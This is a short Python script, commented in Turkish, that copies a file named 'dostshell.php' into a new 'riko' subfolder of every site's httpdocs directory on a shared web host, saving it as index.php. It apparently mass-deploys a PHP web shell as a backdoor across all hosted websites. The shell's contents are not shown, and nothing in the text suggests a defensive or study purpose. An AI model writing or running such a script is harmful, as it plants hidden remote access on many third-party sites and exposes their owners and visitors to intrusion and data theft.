# -*- coding: utf-8 -*-

import glob
import os
import shutil

# Kaynak dosya
source_file = '/var/www/vhosts/dostshell.php'

# Tüm /httpdocs/ dizinlerini bul
for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
    try:
        # Yeni alt klasör yolu
        new_folder = os.path.join(target_dir, 'riko')
        
        # Alt klasörü oluştur (mevcutsa hata vermez)
        if not os.path.exists(new_folder):
            os.makedirs(new_folder)
        
        # Yeni dosyanın yolu
        new_file_path = os.path.join(new_folder, 'index.php')
        
        # Kaynak dosyayı yeni adıyla kopyala
        shutil.copy(source_file, new_file_path)
        
        print("{}, {} olarak kopyalandı.".format(source_file, new_file_path))
    
    except Exception as e:
        print("Hata: {} içinde dosya oluşturulamadı. {}".format(target_dir, e))
